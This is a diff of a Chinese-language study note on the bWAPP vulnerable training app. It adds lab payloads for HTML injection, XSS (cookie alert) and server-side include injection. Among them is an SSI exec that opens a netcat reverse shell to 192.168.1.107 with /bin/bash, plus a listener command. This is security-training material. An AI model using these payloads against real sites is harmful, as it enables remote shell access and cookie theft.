@@ -1,4 +1,4 @@
-# bWAPP（buggy web Application）
+# bWAPP（buggy web Application）2016-11-29
 
 >* bWAPP是一個整合各種常見漏洞和最新漏洞的開源Web應用程式，
 >* bWAPP目的是説明網路安全愛好者、開發人員和學生發現並防止網路漏洞。
@@ -26,6 +26,8 @@ A9:2017-Using Components with Known Vulnerabilities
 A10:2017-Insufficient Logging&Monitoring{新增}
 ```
 # 實戰bWAPP
+>* http://www.freebuf.com/sectool/76885.html
+
 ```
 步驟一:登錄bWAPP
 
@@ -39,8 +41,15 @@ A10:2017-Insufficient Logging&Monitoring{新增}
 ```
 
 ## A1 - Injection [2017_A1]
+
+##### HTML Injection - Reflected (GET)
 ```
-HTML Injection - Reflected (GET)
+在First name:及Last name:欄位都輸入下列
+
+<a href=http://www.google.com>谷歌行腳</a>
+```
+
+```
 HTML Injection - Reflected (POST)
 HTML Injection - Reflected (Current URL)
 HTML Injection - Stored (Blog)
@@ -72,6 +81,24 @@ SQL Injection - Blind (Web Services/SOAP)
 XML/XPath Injection (Login Form)
 XML/XPath Injection (Search)
 ```
+
+##### Server-Side Includes (SSI) Injection
+>* http://www.hackingarticles.in/server-side-injection-explotation-bwapp/
+
+```
+要先確認哪一個欄位有漏洞
+再進行攻擊
+<script>alert(“hack”)</script>
+<script>alert(document.cookie)</script>
+<!–#exec cmd="ls -a" –>
+
+<!–#exec cmd="nc 192.168.1.107 4444 -e /bin/bash" –>
+
+nc -nlvp 444
+Id
+pwd
+```
+
 
 
 ## A2 - Broken Auth. & Session Mgmt.[2017_A2] 
